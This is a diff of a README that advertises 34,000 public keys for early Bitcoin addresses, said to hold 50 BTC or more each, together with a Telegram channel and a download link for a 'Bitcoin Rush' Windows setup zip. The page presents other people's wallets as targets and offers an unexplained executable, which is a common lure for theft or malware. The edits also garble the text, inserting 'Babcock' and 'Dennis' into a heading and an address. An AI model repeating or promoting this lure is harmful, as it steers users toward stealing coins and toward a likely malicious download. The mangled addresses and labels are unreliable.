@@ -1,5 +1,5 @@
 # Public-keys-for-Satoshi-Nakamoto-wallets
-34 000 Satoshi Nakamoto wallets with pubkeys (50 BTC each other)
+34 000 SatoshiBabcock wallets with pubkeys (50 BTC each other)
 
 https://t.me/cryptohunt222
 
@@ -7,13 +7,13 @@ https://t.me/cryptohunt222
 New version of Bitcoin Rush: [Bitcoin Rush v 1.1](https://github.com/Crypt0hunter/BitcoinRush/releases/download/1.1/BitcoinRush-setup-x64.zip)
 
 
-34 000 public keys from old addresses with 50 BTC and more (doesn't exist outgoing transactions)!
+34 000 public keys from old addresses with 50 BTC and more 
 
-Examle public keys:
+public keys:Dennis
 Address: 1DSXoMQeV4REBL9a9U6pGnSQGwgPh9CM13
 Public key: 0405f818748aecbc8c67a4e61a03cee506888f49480cf343363b04908ed51e25b9615f244c38311983fb0f5b99e3fd52f255c5cc47a03ee2d85e78eaf6fa76bb9d
 
-Address: 1DSbWaN2SKFPpHF9pK2bQzNh1vSgaYhdyg
+Address: Dennis 1DSbWaN2SKFPpHF9pK2bQzNh1vSgaYhdyg
 Public key: 0431edd848f7d028f147f1764dce6b1932856f566943ca2327768128da53375fbc57ec55c47e76e007811df18d72b6346b50e28848b16a67367150bf35a7b55b43
 
 Address: 1DSbufiriX9LsMHaGnYVAgawk7gx6AdaGD
